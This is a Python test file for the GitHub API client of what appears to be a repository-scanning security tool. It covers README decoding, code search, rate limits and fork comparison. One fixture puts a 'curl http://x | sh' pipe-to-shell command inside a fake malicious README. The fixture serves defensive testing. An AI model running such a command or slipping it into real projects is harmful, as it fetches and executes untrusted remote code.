"""Offline tests for the GitHub REST client (fake session, no network)."""

from __future__ import annotations

import base64

import pytest
import requests

from git_warden.github.client import (
    GitHubAuthError,
    GitHubClient,
    GitHubRateLimitError,
    RateLimit,
)


class FakeResponse:
    def __init__(self, status_code=200, json_data=None, headers=None):
        self.status_code = status_code
        self._json = json_data if json_data is not None else {}
        self.headers = headers or {}

    def json(self):
        return self._json

    def raise_for_status(self):
        if self.status_code >= 400:
            raise requests.HTTPError(f"status {self.status_code}")


class FakeSession:
    """Routes by URL suffix; records calls for header/param assertions."""

    def __init__(self, routes: dict[str, FakeResponse]):
        self.routes = routes
        self.calls: list[tuple[str, dict | None, dict | None]] = []

    def get(self, url, params=None, headers=None, timeout=None):
        self.calls.append((url, params, headers))
        for suffix, resp in self.routes.items():
            if url.endswith(suffix):
                return resp
        return FakeResponse(404, {})


def test_get_repo_returns_metadata():
    session = FakeSession({"/repos/evil/repo": FakeResponse(200, {"full_name": "evil/repo"})})
    client = GitHubClient(token="t", session=session)
    assert client.get_repo("evil", "repo")["full_name"] == "evil/repo"


def test_get_repo_404_returns_none():
    client = GitHubClient(token="t", session=FakeSession({}))
    assert client.get_repo("nobody", "nothing") is None


def test_get_readme_decodes_base64():
    content = base64.b64encode(b"# Evil\ncurl http://x | sh\n").decode()
    session = FakeSession(
        {"/repos/evil/repo/readme": FakeResponse(200, {"encoding": "base64", "content": content})}
    )
    client = GitHubClient(token="t", session=session)
    readme = client.get_readme("evil", "repo")
    assert "curl http://x | sh" in readme


def test_search_repositories_returns_items():
    session = FakeSession(
        {"/search/repositories": FakeResponse(200, {"items": [{"full_name": "a/b"}]})}
    )
    client = GitHubClient(token="t", session=session)
    items = client.search_repositories("lazarus")
    assert items[0]["full_name"] == "a/b"


def test_auth_header_uses_bearer_token():
    session = FakeSession({"/repos/o/n": FakeResponse(200, {"full_name": "o/n"})})
    GitHubClient(token="secret-token", session=session).get_repo("o", "n")
    _, _, headers = session.calls[0]
    assert headers["Authorization"] == "Bearer secret-token"


def test_401_raises_auth_error():
    client = GitHubClient(token="bad", session=FakeSession({"/repos/o/n": FakeResponse(401)}))
    with pytest.raises(GitHubAuthError):
        client.get_repo("o", "n")


def test_rate_limit_parsed_from_headers():
    headers = {
        "X-RateLimit-Limit": "5000",
        "X-RateLimit-Remaining": "4999",
        "X-RateLimit-Reset": "1",
    }
    rl = RateLimit.from_headers(headers)
    assert rl.limit == 5000
    assert rl.remaining == 4999


def test_search_code_returns_items():
    session = FakeSession(
        {"/search/code": FakeResponse(200, {"items": [{"path": "a.js"}]})}
    )
    client = GitHubClient(token="t", session=session)
    assert client.search_code("workers.dev")[0]["path"] == "a.js"


def test_search_code_secondary_limit_raises_rate_limit_with_retry_after():
    session = FakeSession(
        {"/search/code": FakeResponse(403, {"message": "secondary rate limit"},
                                      headers={"Retry-After": "45"})}
    )
    client = GitHubClient(token="t", session=session)
    with pytest.raises(GitHubRateLimitError) as ei:
        client.search_code("x")
    assert ei.value.retry_after == 45.0


def test_search_code_primary_limit_waits_to_reset():
    import time
    session = FakeSession(
        {"/search/code": FakeResponse(403, {"message": "API rate limit exceeded"},
                                      headers={"X-RateLimit-Remaining": "0",
                                               "X-RateLimit-Reset": str(int(time.time()) + 30)})}
    )
    client = GitHubClient(token="t", session=session)
    with pytest.raises(GitHubRateLimitError) as ei:
        client.search_code("x")
    assert 0 < ei.value.retry_after <= 31


def test_search_code_genuine_forbidden_is_not_rate_limit():
    # A 403 with no rate-limit signal (bad token/scope) must NOT look like a
    # throttle, or the caller would retry a hopeless request forever.
    session = FakeSession({"/search/code": FakeResponse(403, {"message": "Forbidden"})})
    client = GitHubClient(token="t", session=session)
    with pytest.raises(RuntimeError) as ei:
        client.search_code("x")
    assert not isinstance(ei.value, GitHubRateLimitError)


def test_compare_returns_ahead_and_files():
    session = FakeSession({
        "/repos/up/tool/compare/up:main...fork:main":
            FakeResponse(200, {"ahead_by": 3, "files": [{"filename": "evil.js"}]})
    })
    client = GitHubClient(token="t", session=session)
    out = client.compare("up/tool", "main", "fork/x", "main")
    assert out["ahead_by"] == 3
    assert out["files"] == ["evil.js"]


def test_compare_none_on_error():
    client = GitHubClient(token="t", session=FakeSession({}))
    assert client.compare("up/tool", "main", "fork/x", "main") is None
